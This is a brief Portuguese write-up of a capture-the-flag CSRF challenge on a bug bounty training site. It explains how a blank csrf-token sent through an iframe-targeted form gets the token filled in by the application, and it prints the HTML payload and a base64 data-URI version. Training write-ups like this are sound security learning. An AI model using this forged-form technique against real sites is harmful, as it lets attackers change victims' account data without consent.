#ctf 

https://www.bugbountyhunter.com/challenge?id=3

Quando uma requisição POST é feita, um `csrf-token` é enviado junto à ela. Fazendo alguns testes, não é possível retirar o token ou usar token de outro usuário e mesmo trocando o método para GET e removendo o token, nada acontece.

A solução para esse exercício é usar uma **iframe** com `csrf-token` em branco pois a aplicação irá preencher automaticamente.

```html
<form target="frameform" method="POST" action="https://www.bugbountytraining.com/challenges/challenge-3.php"> 
<input type="email" name="username" value="admin@email.com">
<input type="text" name="password" value="secret">
<input type="text" name="csrf-token" value="">
</form>
<iframe name="frameform" src="https://www.bugbountytraining.com/challenges/challenge-3.php"></iframe>
```

Porém é preciso codificar em base64 para o navegador (firefox que eu uso) aceitar.

```html
<iframe src="data:text/html;base64,PGZvcm0gdGFyZ2V0PSJmcmFtZWZvcm0iIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJodHRwczovL3d3dy5idWdib3VudHl0cmFpbmluZy5jb20vY2hhbGxlbmdlcy9jaGFsbGVuZ2UtMy5waHAiPiAKPGlucHV0IHR5cGU9ImVtYWlsIiBuYW1lPSJ1c2VybmFtZSIgdmFsdWU9ImFkbWluQGVtYWlsLmNvbSI+CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXNzd29yZCIgdmFsdWU9InNlY3JldCI+CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjc3JmLXRva2VuIiB2YWx1ZT0iIj4KPC9mb3JtPgo8aWZyYW1lIG5hbWU9ImZyYW1lZm9ybSIgc3JjPSJodHRwczovL3d3dy5idWdib3VudHl0cmFpbmluZy5jb20vY2hhbGxlbmdlcy9jaGFsbGVuZ2UtMy5waHAiPjwvaWZyYW1lPg=="></iframe>
```

Criando uma página que roda esse iframe (usando webhook.site) é possível alterar os dados.